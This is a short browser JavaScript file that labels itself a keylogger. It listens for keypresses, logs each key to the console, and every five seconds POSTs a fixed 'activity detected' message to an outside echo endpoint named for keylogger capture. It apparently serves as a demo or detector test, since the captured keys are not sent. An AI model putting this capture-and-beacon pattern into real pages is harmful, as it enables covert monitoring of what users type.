console.log("Keylogger script loaded.");

let tamperDetected = false;

document.addEventListener('keypress', (event) => {
    console.log(`Key pressed: ${event.key}`);
    tamperDetected = true;
});

function sendTamperingMessage() {
    if (tamperDetected) {
        fetch('https://echo.free.beeceptor.com/keylogger_capture_data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ message: "Keylogger detected activity." })
        })
            .then(response => response.text())
            .then(data => console.log('Tampering message sent:', data))
            .catch(error => console.error('Error sending tampering message:', error));

        tamperDetected = false;
    }
}

setInterval(sendTamperingMessage, 5000);
